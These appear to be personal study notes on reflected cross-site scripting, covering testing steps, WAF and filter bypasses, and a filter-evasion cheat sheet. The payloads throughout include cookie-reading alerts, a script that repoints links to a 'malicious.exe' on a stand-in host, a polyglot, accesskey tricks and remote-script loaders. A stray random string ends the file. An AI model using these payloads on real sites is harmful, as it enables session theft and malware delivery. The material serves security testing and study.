ji


Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. 
The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously 
crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, 
improperly processed by the application, and returned to the victim.

Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent 
XSS attacks and, since the attack payload is delivered and executed via a single request and response, 
they are also referred to as first-order or type 1 XSS.

STEPS OF ATTACKS :-
1) Design step :- The attacker tests and creates an offending uri.
2) Social Engineering step :- in which she convinces her victims to load this URI on their browsers.
3) Execution :- the eventual execution of the offending code using the victim’s browser.

TESTING OF XSS :- 

1) Black Box testing...
   It has three phases :-
   a) Detect the input vectors :--
      Detect input vectors. For each web page, the tester must determine all the web application’s user-defined variables and how to input them. 
      This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. 
      Typically in-browser HTML editors or web proxies are used to view these hidden variables. 
   b) Analyze input vectors..
      To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, 
      but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated 
      predefined list of known attack strings, or manually. Some example of such input data are the following:
      <script>alert(123)</script>
      “><script>alert(document.cookie)</script>
   c) Check Impact :-
      For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a 
      realistic impact on the web application’s security. This requires examining the resulting web page HTML and searching for the test input. Once found, 
      the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters 
      will depend on the context of that section of HTML.

     Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are: 
      > (greater than)
      < (less than)
      & (ampersand)
      ' (apostrophe or single quote)
      " (double quote)

    Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. 
    These characters include:
      \n (new line)
      \r (carriage return)
      ' (apostrophe or single quote)
      " (double quote)
      \ (backslash)
      \uXXXX (unicode values)

ATTACK EXAMPLES ::::----
The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play 
with the user variable and try to trigger the vulnerability.
1) For example, consider a site that has a welcome notice Welcome %username% and a download link.
   https://vulnerable.com/user=adi
   => if no sanitisation is applied then it can be exploited by :- 
       https://vulnerable.com/user=<script>alert(document.domain)</script>
  => it indicates there is an xss vulnerability and attacker can execute code of their own type 
2) let's try other piece of code ...
   http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
   AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>

  This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.

::::::-----------------------------------------------------BYPASSING XSS FILTERS :------------------------------------------------------

Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, 
or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. 
Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, 
unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.

Thus, the majority of XSS prevention must depend on the web application’s sanitization of untrusted user input. There are several mechanisms
available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the 
application detects and corrects invalid input is another primary weakness in preventing XSS. A blacklist may not include all possible attack 
strings, a whitelist may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. 
All of these allow attackers to circumvent XSS filters.

:::::::::::::::::::---------------------------------------XSS FILTER EVASION CHEAT SHEET :-----------------------------------------------

1) BASIC TEST WITHOUT FILTER EVASION :-
This attack, which uses normal XSS JavaScript injection
=> <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>

2) XSS LOCATOR (POLYGlOT) :-
This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:
=> javascript:/*--></title></style></textarea></script></xmp>
   <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
3) IF HTML ENCODED LIKE &gt;&lt; 
   => here angle brackets are html encoded > (&gt;) < (&lt;)
   THen use eventlistners like
  "onmouseover="alert(1)"
4) WHEN XSS IS IN BETWEEN HTML TAGS..
   => we need to introduce new tags to run our scripts..
      ex:- <h1>hii aditya </h1>
           run the script :- </h1><script>alert(1)</script>
5) BYPASSING THE WAF..
   by using waf most of the attributes and the tags can be blocked.. 
   => IF most of the tags and attributes are blocked first search which tags are still not blocked..
   => use burp suite intruder to select which html tag is not blocked and we can use it to exploit.
   => after that use burp suite intruder to select which attribute can be used to exploit.
   => after found perform the exploit.

6) Bypassing xss filter using HTML Escape..
    & -> &amp;
    < -> &lt;
    > -> &gt;
    " -> &#034;
    ' -> &#039;
    normally for security concerns dev use html escaping so that compiler does not treat them as code and excecute them
    but we can use html escaping to bypass certain encoding and insert some script to trick the filter so that client can execute the code.

6) xss in hidden input field..
  hidden input field are very difficult to exploit because events like onmouseover , onfocus would not work because the ele is hidden
  we can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. 
  On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination 
  using a different key in the access key attribute. Here is the vector:
  EX :- <input type="hidden" accesskey="X" onclick="alert(1)">

  This technique now works in Chrome! It also works in link elements that means previously unexploitable XSS bugs in link elements where you 
  only control attributes can be exploited using this technique. For example you might have a link element with a rel attribute on canonical, 
  if you inject the accesskey attribute with an onclick event then you have XSS. 
  
  EX :- <link rel="canonical" accesskey="X" onclick="alert(1)" />

7) XSS WITH REMOTE JS ...
  
  All the following can be used like in this example form: <svg onload=PAYLOAD>.
  
  1 – XHR
  The old way, but uses too many chars. Response is written in the current document with write() so it needs to contain HTML.
  "var x=new XMLHttpRequest();x.open('GET','//0');x.send();
  x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
  
  2 – Fetch
  The new fetch() API makes things easier. Again, response is written and must be HTML.
  fetch('//0').then(r=>{r.text().then(w=>{write(w)})})
  
  3 – Create Element
  Straightforward, a script element is created in DOM. Response must be javascript code.
  with(top)body.appendChild (createElement('script')).src='//0'
  
  4 – jQuery Get
  If there’s a native jQuery library loaded in target page, request becomes shorter. Response must be HTML.
  $.get('//0',r=>{write(r)})
  
  5 – jQuery Get Script
  Like above, but response must be javascript code.
  $.getScript('//0')
  getscript-xss
  In order to make remote calls easier to handle, the following PHP file can be used. It has the CORS requirement and HTML + javascript code 
  combined in such a way that it works with both types of inclusion in the document.

8) XSS IN JAVASCRIPT :-
   AS the web evolved the new frameworks and js libraries like angular,react gives very good dev experiece and by design 
   they print our script as simple html text if we try to insert any malicious code ...
   How TO BYPASS THEM :-
   i) using innerHTML we can html tag and add it to js ele and run vulnerable code..
   ii) using createElement to create a ele and insert into component 






7R__jHB6x3W!Y9HEKocBb-&n8*2F{2Ty




